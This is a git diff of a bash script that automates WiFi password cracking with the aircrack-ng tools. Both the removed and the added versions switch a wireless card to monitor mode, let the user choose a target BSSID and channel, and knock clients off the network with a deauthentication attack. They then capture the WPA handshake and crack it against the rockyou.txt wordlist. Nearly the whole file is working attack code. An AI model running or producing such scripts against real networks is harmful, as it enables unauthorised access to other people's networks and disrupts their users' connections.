@@ -1,41 +1,34 @@
 #!/bin/bash
 clear
-echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
-echo "|A|i|r|c|r|a|c|k| |A|u|t|o|m|a|t|e|d|"
-echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
+echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+"
+echo "|W|i|F|i| |A|u|t|o|m|a|t|i|o|n|"
+echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+"
 echo
 echo Enter Interface Name:
 read interface
-#interface=$(ifconfig | grep wl | cut -d ":" -f1)
-airmon-ng start $interface
-airmon-ng check kill
-echo Enter Monitor Mode Interface:
-read mon
-#mon=$(ifconfig | grep wl | cut -d ":" -f1)
-airodump-ng $mon
-echo Enter BSSID Of Target
-read bid
-echo $bid
-echo Enter Channel Of Target
-read chnl
-#xterm -hold -e sudo "airodump-ng --bssid $bid --channel $chnl --write $filn $mon"
-client=FF:FF:FF:FF:FF:FF
-airodump-ng --ig -w cap -c $chnl --bssid $bid $mon & sleep 6 &&
-xterm -hold -e "aireplay-ng --ig --deauth 0 -a $bid -c $client $mon"
-sleep 4
-clear
-echo "1. Use Default Wordlist(rockyou.txt)."
-echo "2. Specify a Custom One."
-read option
-if [ $option == "1" ]; then
-   wordlist="/usr/share/wordlists/rockyou.txt"
-else
-   echo Enter Path Of Your Custom Wordlist.
-   read wordlist
-fi
-aircrack-ng -w $wordlist ./cap-01.cap
-echo Disabling Monitor Mode........
-airmon-ng stop $mon
-echo Deleting Handshake Files.......
-rm cap*
-echo done!
+printf "%s " "$interface" > data
+echo "[i] setting interface to monitor mode."
+sudo ifconfig $interface down
+sudo iwconfig $interface mode monitor
+sudo ifconfig $interface up
+airodump-ng $interface &
+sleep 10
+killall airodump-ng
+echo "Enter BSSID Of Target: "
+read bssid
+echo "chosen target: $bssid"
+printf "%s " "$bssid" >> data
+echo "Enter Channel Of Target: "
+read channel
+airodump-ng --ig -c $channel --bssid $bssid $interface &
+sleep 10
+killall airodump-ng
+echo "enter client ID to perform Deauth attack: "
+echo "[i] Run deauth.sh in a separate shell after pressing enter"
+echo "[i] press ctrl + c after handshake capture"
+read client
+printf "%s" "$client" >> data
+cat data 
+airodump-ng --ig -w cap -c $channel --bssid $bssid $interface
+aircrack-ng -J file cap*.cap
+aircrack-ng -w rockyou.txt ./cap*.cap
